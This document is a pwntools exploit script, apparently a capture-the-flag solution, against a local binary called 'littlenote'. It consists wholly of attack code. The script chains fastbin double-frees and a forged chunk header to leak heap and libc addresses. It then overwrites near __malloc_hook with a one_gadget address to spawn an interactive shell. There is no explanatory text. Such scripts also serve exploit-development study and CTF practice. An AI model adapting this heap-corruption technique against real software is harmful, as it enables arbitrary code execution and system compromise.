from pwn import *
io=process('./littlenote')
def add(content):
    io.sendline('1')
    io.sendafter('e\n',content)
    io.sendlineafter('?\n','Y')
    io.recvuntil('e\n')
def show(index):
    io.sendline('2')
    io.sendlineafter('?\n',str(index))
    return (io.recvuntil("\n"))[:-1]

def free(index):
    io.sendline('3')
    io.recvuntil('?\n')
    io.sendline(str(index))
    io.recvuntil('Done\n')

add('\x00'*0x58+p64(0x71))
add('1')
add(p64(0x0)*5+p64(0x41))#bypass
free(1)
free(0)
free(1)

heap_base=u64((show(0)).ljust(8,'\x00'))-0x70
print "heap_base -> " + hex(heap_base)
add(p64(heap_base+0x60))
add('1')
add('1')
add('\x00'*8+p64(0xA1))
free(1)
libc_base=u64((show(1)).ljust(8,'\x00'))-0x3C4B78
print "libc_base -> " + hex(libc_base)
one_gadget=libc_base+0xf02a4
print "one_gadget -> " + hex(one_gadget)
add('7') # 7
add('8') # 8
add('9') # 9
free(7)
free(8)
free(7)
point=libc_base+0x3c4af5-8
print "point -> " +hex(point) 
add(p64(point)) # 10
add('b') # 11
add('c') # 12
add('a'*19+p64(one_gadget))
io.sendline('1')
io.recv()
io.interactive()
